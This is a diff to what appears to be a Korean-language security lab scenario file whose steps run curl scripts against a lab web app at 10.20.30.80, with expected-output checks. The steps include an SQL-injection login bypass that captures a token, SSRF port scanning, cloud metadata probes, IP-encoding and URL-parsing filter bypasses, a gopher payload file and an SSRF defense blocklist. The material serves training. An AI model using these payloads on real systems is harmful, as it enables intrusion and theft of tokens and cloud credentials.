@@ -25,6 +25,7 @@ steps:
     type: output_contains
     expect: Feedbacks
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"''
     -f4) && echo ''=== Feedbacks API ==='' && curl -s http://10.20.30.80:3000/api/Feedbacks/ -H "Authorization: Bearer $TOKEN" | head -c 300 && echo '''' && echo ''=== Profile Image ==='' && curl -s -o
     /dev/null -w ''HTTP:%{http_code}'' http://10.20.30.80:3000/profile -H "Authorization: Bearer $TOKEN"'
@@ -41,6 +42,7 @@ steps:
     type: output_contains
     expect: Port Scan Complete
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== SSRF Internal Port Scan ==='' && for PORT in 22 80 443 3000 3306 5432 6379 8080 9200; do echo -n "Port $PORT: " && curl -s -o /dev/null --max-time 2 -w ''HTTP:%{http_code} time:%{time_total}s''
     http://10.20.30.80:$PORT/ 2>/dev/null && echo ''''; done && echo ''=== Port Scan Complete ==='''
   risk_level: medium
@@ -57,6 +59,7 @@ steps:
     type: output_contains
     expect: Metadata SSRF Test Complete
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Cloud Metadata SSRF Simulation ==='' && echo ''[AWS 169.254.169.254]'' && curl -s -o /dev/null -w ''HTTP:%{http_code} time:%{time_total}s'' --max-time 3 http://169.254.169.254/latest/meta-data/
     2>/dev/null && echo '''' && echo ''[GCP metadata.google.internal]'' && curl -s -o /dev/null -w ''HTTP:%{http_code} time:%{time_total}s'' --max-time 3 -H ''Metadata-Flavor: Google'' http://metadata.google.internal/computeMetadata/v1/
     2>/dev/null && echo '''' && echo ''=== Metadata SSRF Test Complete ==='''
@@ -75,6 +78,7 @@ steps:
     type: output_contains
     expect: IP Bypass Test Complete
     field: stdout
+  target_vm: attacker
   script: echo '=== IP Bypass Techniques ===' && echo '[Standard] 127.0.0.1:3000' && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 http://127.0.0.1:3000/ && echo '' && echo '[Decimal] 2130706433'
     && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 http://2130706433:3000/ 2>/dev/null && echo '' && echo '[Hex] 0x7f000001' && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 http://0x7f000001:3000/
     2>/dev/null && echo '' && echo '[Short] 127.1' && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 http://127.1:3000/ 2>/dev/null && echo '' && echo '[IPv6] ::1' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
@@ -93,6 +97,7 @@ steps:
     type: output_contains
     expect: URL Parsing Test Complete
     field: stdout
+  target_vm: attacker
   script: echo '=== URL Parsing Confusion ===' && echo '[@-based] http://google.com@10.20.30.80:3000/' && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 'http://google.com@10.20.30.80:3000/' &&
     echo '' && echo '[#fragment] http://evil.com#@10.20.30.80:3000/' && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 'http://10.20.30.80:3000/#@evil.com' && echo '' && echo '=== URL Parsing
     Test Complete ==='
@@ -111,6 +116,7 @@ steps:
     type: output_contains
     expect: DNS Rebinding Analysis Complete
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== DNS Rebinding Analysis ==='' && echo ''[DNS Lookup]'' && nslookup 10.20.30.80 2>/dev/null || echo ''Direct IP - no DNS resolution needed'' && echo '''' && echo ''[DNS Rebinding 3-Stage
     Attack]'' && echo ''Stage 1: evil.com resolves to EXTERNAL_IP (passes filter)'' && echo ''Stage 2: TTL expires, evil.com now resolves to 127.0.0.1'' && echo ''Stage 3: Server makes request to 127.0.0.1
     (internal access)'' && echo '''' && echo ''[Defense Requirements]'' && echo ''- Resolve DNS BEFORE and AFTER filter check'' && echo ''- Block private IP ranges after resolution'' && echo ''- Set minimum
@@ -148,6 +154,7 @@ steps:
     type: output_contains
     expect: Gopher payloads saved
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/ssrf_gopher.txt << ''EOF''
 
     === Gopher SSRF Payloads (학습 목적) ===
@@ -185,6 +192,7 @@ steps:
     type: output_contains
     expect: SSRF Defense Design Complete
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== SSRF Defense Allowlist Design ==='' && echo ''[Block IP Ranges]'' && echo ''  127.0.0.0/8    - Loopback'' && echo ''  10.0.0.0/8     - Private Class A'' && echo ''  172.16.0.0/12  -
     Private Class B'' && echo ''  192.168.0.0/16 - Private Class C'' && echo ''  169.254.0.0/16 - Link-local (metadata)'' && echo ''  0.0.0.0/8      - This network'' && echo ''  ::1/128        - IPv6 loopback''
     && echo '''' && echo ''[Block Protocols]'' && echo ''  gopher://, file://, dict://, ftp://'' && echo '''' && echo ''[WAF Test]'' && curl -s -o /dev/null -w ''Port 80 internal URL: HTTP:%{http_code}''
@@ -242,6 +250,7 @@ steps:
     type: output_contains
     expect: SSRF 취약점 진단 보고서
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/ssrf_report.txt << ''EOF''
 
     === SSRF 취약점 진단 보고서 ===
